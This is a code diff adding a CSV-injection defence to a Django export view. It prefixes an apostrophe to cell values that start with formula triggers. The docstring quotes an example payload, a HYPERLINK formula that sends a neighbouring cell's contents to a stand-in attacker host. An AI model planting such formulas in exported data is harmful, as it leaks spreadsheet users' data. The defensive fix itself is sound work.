@@ -929,6 +929,39 @@ def export_filename(extension):
     return f"brief_items_{timezone.localtime().strftime('%Y-%m-%d_%H-%M')}.{extension}"
 
 
+# Characters that make a spreadsheet treat a cell as a formula rather than as text.
+# TAB and CR are in the list because Excel strips leading whitespace before deciding, so
+# "\t=cmd|..." reaches the formula parser exactly as "=cmd|..." would.
+FORMULA_TRIGGERS = ("=", "+", "-", "@", "\t", "\r")
+
+
+def csv_safe(value):
+    """
+    Neutralise a value that a spreadsheet would otherwise run as a formula.
+
+    The attack this closes is CSV injection, and the path is real in this project rather than
+    theoretical: the create form on /briefs/<pk>/ takes a free-text title and needs no login,
+    so anyone can store
+
+        =HYPERLINK("http://evil.example/leak?c="&A1,"Click for your refund")
+
+    as an item title. Nothing happens on the website -- Django escapes it on the page. It goes
+    off when a teammate downloads this export and opens it in Excel or Sheets, which parse a
+    leading =, +, -, @, tab or carriage return as the start of a formula. Quoting does not help:
+    Excel strips the CSV quotes first and evaluates what is inside. Depending on the version
+    that is a link that exfiltrates a neighbouring cell, a WEBSERVICE() call, or a DDE command.
+
+    The fix is the standard one: prefix the value with an apostrophe, which every spreadsheet
+    reads as "the rest of this cell is text". The apostrophe is not part of the value and is not
+    displayed in the cell, though it IS a byte in the file, which is why the JSON export does
+    not do this -- JSON has no formula evaluator, so there is nothing to defend against and
+    mangling the data would be pure loss.
+    """
+    if isinstance(value, str) and value.startswith(FORMULA_TRIGGERS):
+        return "'" + value
+    return value
+
+
 def export_items_csv(request):
     """
     PART 3, CSV EXPORT: every BriefItem as a downloadable spreadsheet.
@@ -948,7 +981,7 @@ def export_items_csv(request):
         record = serialize_item(item)
         # Indexing EXPORT_COLUMNS rather than record.values() is what keeps every row aligned
         # with the header no matter what order the serializer builds its dict in.
-        writer.writerow([record[column] for column in EXPORT_COLUMNS])
+        writer.writerow([csv_safe(record[column]) for column in EXPORT_COLUMNS])
 
     response = HttpResponse(buffer.getvalue(), content_type="text/csv")
     response["Content-Disposition"] = f'attachment; filename="{export_filename("csv")}"'
